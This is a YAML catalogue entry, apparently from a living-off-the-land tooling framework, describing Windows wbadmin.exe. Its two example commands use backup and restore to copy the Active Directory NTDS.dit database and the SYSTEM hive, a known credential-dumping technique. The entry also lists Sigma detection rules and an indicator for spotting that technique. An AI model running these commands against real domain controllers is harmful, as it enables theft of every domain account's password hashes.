---
id: windows-credential-wbadmin
namespace: windows:credential:wbadmin
name: wbadmin
description: 'Windows Backup Administration utility Located at: C:\Windows\System32\wbadmin.exe.'
author: Chris Eastwood
version: 1.0.0
capabilities:
- credential.dump
platforms:
- windows
risk_level: critical
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- wbadmin
parameters: []
features: []
execution:
  template: wbadmin
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx) (Snapshoting of Active Directory NTDS.dit database)
  command: wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
- description: Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers. (Dumping of Active Directory NTDS.dit database)
  command: wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
references:
- label: windows-privesc-with-sebackupprivilege-65d2cd1eb96
  url: https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
techniques:
- credential-access
mitre_ids:
- T1003.003
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
- type: ioc
  description: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"
install:
- method: choco
  package_name: wbadmin
  commands:
  - choco install wbadmin
---


# wbadmin

wbadmin is a Windows LOLBin. Windows Backup Administration utility Located at: C:\Windows\System32\wbadmin.exe.
